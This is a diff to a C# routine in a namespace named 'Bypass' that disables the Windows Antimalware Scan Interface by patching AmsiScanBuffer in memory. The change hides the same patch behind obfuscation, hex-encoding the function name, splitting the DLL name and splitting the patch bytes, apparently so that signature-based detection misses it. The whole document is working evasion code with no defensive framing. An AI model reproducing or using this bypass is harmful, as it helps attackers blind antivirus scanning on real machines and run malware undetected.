@@ -50,21 +50,23 @@ namespace Bypass
 
         public static int Disable()
         {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            if (TargetDLL == IntPtr.Zero) { return 1; }
-
-            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
-            if (ASBPtr == IntPtr.Zero) { return 1; }
-
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
-
-            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
-
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
+            string buffer="";
+            string[] hexbuffersplit = hexbuffer.Split(' ');
+            foreach (String hex in hexbuffersplit)
+            {
+                int value = Convert.ToInt32(hex, 16);
+                buffer+= Char.ConvertFromUtf32(value);
+            }
+            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
+            VirtualProtect(Address, size, 0x40, out p);
+            byte c1=0xB8,c2=0x80;			 
+            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-            MoveMemory(ASBPtr, unmanagedPointer, 6);
+            MoveMemory(Address, unmanagedPointer, 6);
 
             return 0;
         }
